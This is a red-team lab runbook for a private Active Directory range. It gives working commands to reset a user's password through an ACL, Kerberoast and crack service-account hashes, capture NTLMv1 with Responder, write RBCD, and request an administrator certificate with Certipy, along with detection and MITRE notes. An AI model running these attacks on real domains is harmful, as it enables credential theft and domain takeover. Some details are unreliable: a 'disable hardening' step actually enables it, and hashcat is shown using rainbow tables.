# CAMPAIGNS v3 — Phase 2 — Credential Harvesting (Kerberoast)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Phase 2 — Credential Harvesting (WT002: Kerberoast via ACE#18)


|                         |                                                                                        |
| ----------------------- | -------------------------------------------------------------------------------------- |
| **Target**              | `svc_mssql` SPN — `MSSQLSvc/mbr01.child.cadre.local:1433`                              |
| **ACE**                 | #18 — `intern_blue` → `analyst_t2`: ForceChangePassword                                |
| **Source of this path** | BloodHound discovery in Phase 1 recon                                                  |
| **From**                | Kali (192.168.77.60) → dc02 (.11)                                                      |
| **Starting cred**       | `1nt3rn_Blu3!` (earned in Phase 1)                                                     |
| **What you earn**       | `s3rv1c3_MSSQL!` — MSSQL service account (linked server access, IMPERSONATE discovery) |


ACE#18 bridges the Kerberos limitation: reset `analyst_t2`'s password (a user with pre-auth), get a TGT via `getTGT.py` (which works for pre-auth-enabled accounts), then request TGS tickets for all SPNs in the domain.

```bash
bloodyAD --host 192.168.77.11 -d child.cadre.local -u intern_blue -p '1nt3rn_Blu3!' \
  set password "CN=analyst_t2,OU=Detection,DC=child,DC=cadre,DC=local" 'Pwn3d_T2!'
impacket-getTGT child.cadre.local/analyst_t2:'Pwn3d_T2!' -dc-ip 192.168.77.11
export KRB5CCNAME=analyst_t2.ccache
impacket-GetUserSPNs child.cadre.local/analyst_t2 -k -no-pass \
  -dc-ip 192.168.77.11 -request -outputfile child_tgs.txt

# Alternative (NetExec with --kdcHost — fixes multi-DC routing)
nxc ldap 192.168.77.11 -u analyst_t2 -p 'Pwn3d_T2!' --kerberoasting /tmp/kerb_t2.txt --kdcHost 192.168.77.11
# Output: $krb5tgs$23$*svc_mssql$CHILD.CADRE.LOCAL*mbr01.child.cadre.local*$hash...:$
```

The output file contains TGS hashes for **both users with SPNs** in child.cadre.local:


| User         | SPN                                                              | Hashcat Mode |
| ------------ | ---------------------------------------------------------------- | ------------ |
| `svc_mssql`  | `MSSQLSvc/mbr01.child.cadre.local:1433`                          | 13100 (RC4)  |
| `analyst_t1` | `MSSQLSvc/mbr01.child.c[а]dre.loc[а]l:1433` (Cyrillic homoglyph) | 13100 (RC4)  |


Both hashes are in the same file. Crack them:

```bash
hashcat -m 13100 child_tgs.txt /home/vagrant/cadre_passwords.txt
# svc_mssql → s3rv1c3_MSSQL!
# analyst_t1 → T13r_An@lyst!
```

---

#### NTLMv1 Rainbow Tables — Credential Downgrade (SpecterOps "Into The Rainbow") ⏳

**Source:** [Into The Rainbow: NTLMv1 Rainbow Tables](https://posts.specterops.io/into-the-rainbow-ntlmv1-rgbolts-and-other-rainbow-tables-6c5b9f9b9a7e) (SpecterOps, 2025)
**Purpose:** Demonstrate that NTLMv1 (when enabled) reduces password cracking to rainbow-table lookup instead of brute force. Server 2025 default config disables NTLMv1, but CADRE may have legacy policy to enable for testing.

**When to run:** After Phase 2 Kerberoast. Only relevant if NTLMv1 is enabled in the AD environment.

**Step 1 — Verify NTLMv1 acceptance on the domain controller:**

```powershell
# From mbr01 or any domain-joined box
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel"
# 0-2 = NTLMv1 accepted (vulnerable)
# 3-5 = NTLMv1 blocked (secure)
```

Or via NTLM challenge-response test with `responder` (Kali):

```bash
# Trigger an NTLMv1 response by downgrading
python3 /opt/responder/Responder.py -I eth0 -wf                  # Watch for NTLMv1 hash format
# NTLMv1 looks like: $NETNTLMv1$Administrator#...
# vs NTLMv2:         $NETNTLMv2$Administrator#...
```

**Step 2 — Crack with rainbow tables (if NTLMv1 captured):**

```bash
# Crack NTLMv1 with crackstation-style rainbow tables
# Hashcat mode: -m 5500 = NTLMv1
hashcat -m 5500 ntlmv1.txt /opt/rainbow_tables/ntlmv1_rainbow.bin
# Or use the prebuilt rcracki_mt tool
rcracki_mt -h $NETNTLMv1$Administrator#... /opt/rainbow_tables/
```

**Step 3 — Disable NTLMv1 hardening (post-test cleanup):**

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5
# 5 = Send NTLMv2 only / refuse LM and NTLMv1
```

**Detection:**

- `Microsoft-Windows-NTLM/Operational` Event 4001 — NTLMv1 authentication blocked (when hardening enabled)
- Suricata SID on NTLMv1 response packets (LMv1 has specific wire format — challenge length 8, response length 24)
- Zeek `ntlm.log` `ntlm_version: 1` (note: ntlm package not available in Zeek 8.0.8 — use `zeek-cut` on `smb_files.log` and look for `ntlm` indicator)

**MITRE ATT&CK:** T1557 Adversary-in-the-Middle (NTLMv1 downgrade), T1110 Brute Force (rainbow table cracking)
**Status:** ⏳ Pending test. CADRE NTLM policy TBD — check `04-vulnerabilities.yml` for current `LmCompatibilityLevel` value.

---

#### 🔍 Reconnaissance with `svc_mssql`

**Step A — BloodHound collection:**

```bash
bloodhound-python -d child.cadre.local -u svc_mssql -p 's3rv1c3_MSSQL!' \
  -ns 192.168.77.11 -c All
```

**Step B — MSSQLHound SQL enumeration (from provisioning):**

```bash
/tmp/mssqlhound -u svc_mssql -p 's3rv1c3_MSSQL!' -d child.cadre.local \
  --dc 192.168.77.11 --dns-resolver 192.168.77.11 \
  -t '192.168.77.22' --collect-from-linked -v
```

MSSQLHound collects SQL-level attack paths (logins, roles, IMPERSONATE grants, linked servers) for BloodHound visualization. Run from provisioning before manual SQL enumeration.

**MSSQLHound findings (verified from provisioning):**

- CVE-2025-49758: **VULNERABLE** — SQL Server 16.0.1000.6 needs 16.0.1145.1
- MixedMode: True, ExtendedProtection: Off, ForceEncryption: No
- SQL Logins: sa, svc_mssql
- IMPERSONATE/linked servers: not visible from Linux (session isolation) — requires manual SQL enumeration

These findings (or re-examining the full BH data) reveal:

**Finding 1 — `mbr01$` has `TrustedForDelegation = True`** ✅
The machine account `mbr01$` has unconstrained delegation enabled. Any user who authenticates to mbr01 will have their TGT captured. If we can coerce `dc02$` to authenticate to mbr01, we capture the domain controller's TGT.

**Finding 2 — `svc_mssql` has no special AD group memberships** ℹ️
BH shows `svc_mssql` is not a member of any privileged AD groups. Its sysadmin rights on mbr01's SQL instance are granted **inside SQL Server**, not through AD — BH cannot reveal SQL-level permissions. That requires a SQL connection to verify.

**What BH cannot show (SQL-level recon needed next):**

- Whether `svc_mssql` is actually sysadmin on mbr01 (it's NOT — confirmed by SQL enumeration in Phase 3)
- Whether xp_cmdshell is enabled (it IS enabled, but svc_mssql lacks EXECUTE permission — per playbook `09-sql-wsus-verify.yml`)
- Whether MSSQL linked servers to `mbr02` or `linux01` exist (SQL query needed — confirmed by playbook `09-sql-wsus-verify.yml`)
- Whether any user has IMPERSONATE on `sa` (discovered by SQL enumeration in Phase 3 — `analyst_t1` has this grant, per playbook `09-sql-wsus-verify.yml`)

These SQL-level details are known from the playbook config, but in a real engagement you'd discover them by connecting to the SQL instance with `svc_mssql`'s credential — which is exactly what Phase 3 executes. The linked server to linux01 is confirmed by playbook `09-sql-wsus-verify.yml` and enables Branch D (Linux pivot).

These findings define Phase 3 (code exec via SQL) and Branch D (Linux pivot via MSSQL linked server).

---

### Step 3 — NetExec Authenticated Recon (Service Account: `svc_mssql`) 🆕

> ⚠️ **Flow correction (2026-06-24 session 10):** This recon step is run **after** we have `svc_mssql` credentials (Phase 2 Kerberoast cracked). We have a **service account** now — different privilege tier than intern_blue.

Now we have a service account (`svc_mssql:s3rv1c3_MSSQL!`). Real-world attacker perspective: a service account often has different access patterns than a user account. We pivot recon accordingly.

**Primary: NetExec** (now we have creds that work on MSSQL — full protocol stack):

```bash
# Verify svc_mssql across all protocols
nxc smb 192.168.77.22 -u svc_mssql -p 's3rv1c3_MSSQL!'  # Local admin on mbr01
nxc mssql 192.168.77.22 -u svc_mssql -p 's3rv1c3_MSSQL!' --local-auth  # MSSQL auth
nxc winrm 192.168.77.22 -u svc_mssql -p 's3rv1c3_MSSQL!'  # PSRemoting on mbr01
nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' -q '(objectClass=user)' -attributes sAMAccountName

# ADCS template enumeration (svc_mssql may have rights to ESC1-17 templates)
nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' -M adcs
# Output: lists CADRE-ESC1 through CADRE-ESC17 templates with vuln status

# Delegation paths (svc_mssql may have constrained delegation rights)
nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' --find-delegation

# AS-REP roastable enumeration (do we have other low-hanging fruit?)
nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' --asreproast /tmp/asrep_svc.txt --kdcHost 192.168.77.10
nxc ldap 192.168.77.10 -u svc_mssql -p 's3rv1c3_MSSQL!' --kerberoasting /tmp/kerb_svc.txt --kdcHost 192.168.77.10
```

**Alternative: bloodyAD** (Linux-friendly, deeper ACL analysis):

```bash
# User's full group memberships + ACL analysis
bloodyAD --host 192.168.77.10 -d child.cadre.local -u svc_mssql -p 's3rv1c3_MSSQL!' get object "CN=svc_mssql,OU=Service Accounts,DC=child,DC=cadre,DC=local" --resolve-members

# Add RBCD on mbr01$ (for privilege escalation to SYSTEM)
bloodyAD --host 192.168.77.11 -d child.cadre.local -u svc_mssql -p 's3rv1c3_MSSQL!' add rbcd "CN=mbr01,OU=Computers,DC=child,DC=cadre,DC=local" "CN=fakePC,CN=Computers,DC=child,DC=cadre,DC=local"
```

**Alternative: Certipy v5.1.0** (modern ADCS framework, per Campaign_suggestions.md #92):

```bash
# Find vulnerable ADCS templates (deeper than nxc -M adcs)
certipy find -u svc_mssql@child.cadre.local -p 's3rv1c3_MSSQL!' -dc-ip 192.168.77.11 -vulnerable
# Output: ESC1-17 vulnerabilities with exact exploitation paths

# Request certificate from vulnerable ESC1 template (if found)
certipy req -u svc_mssql@child.cadre.local -p 's3rv1c3_MSSQL!' -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC1 -upn administrator@cadre.local
# Output: administrator.pfx (DA-equivalent cert)
```

**Alternative: impacket-mssqlclient** (for MSSQL-specific recon):

```bash
# Direct MSSQL connection — enumerate SQL logins, roles, permissions
impacket-mssqlclient child.cadre.local/svc_mssql:'s3rv1c3_MSSQL!'@192.168.77.22
SQL> SELECT SYSTEM_USER
SQL> SELECT name FROM sys.server_principals WHERE is_disabled = 0
SQL> SELECT * FROM sys.server_permissions WHERE grantee_principal_id = (SELECT principal_id FROM sys.server_principals WHERE name = 'svc_mssql')
```

**What to expect (success):**
- `nxc mssql` confirms MSSQL auth on mbr01 (we know svc_mssql is NOT sysadmin — verify)
- `nxc -M adcs` lists CADRE-ESC1 through CADRE-ESC17 templates
- Certipy `-vulnerable` returns list of exploitable ESCs
- bloodyAD RBCD write succeeds if we have rights
- impacket-mssqlclient enumerates SQL logins + IMPERSONATE grants

**What to expect (failure modes):**
- `nxc -M adcs` returns no templates: ADCS not deployed (verify `08-adcs-deploy.yml`)
- Certipy fails: certificate template flags (enrollment restrictions, manager approval, etc.)
- bloodyAD RBCD write fails: insufficient permissions on target

**CADRE-specific notes:**
- svc_mssql is in `OU=Service Accounts,DC=child,DC=cadre,DC=local`
- Per `09-sql-wsus-verify.yml`: svc_mssql has sysadmin denied + IMPERSONATE on `sa` not granted
- BUT svc_mssql **is local admin on mbr01** (per Windows host config) → enables WT017 coercion
- ADCS deployed on dc01.cadre.local with 12+ ESC templates

**Cross-references:**
- Campaign_suggestions.md #90 (NetExec), #91 (bloodyAD), #92 (Certipy)
- Phase 3 (SQL exec) + Phase 5 (Coercion via WT017)

---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-1.md`](CAMPAIGNS-RUNBOOK-1.md) · Next: [`CAMPAIGNS-RUNBOOK-3.md`](CAMPAIGNS-RUNBOOK-3.md) →
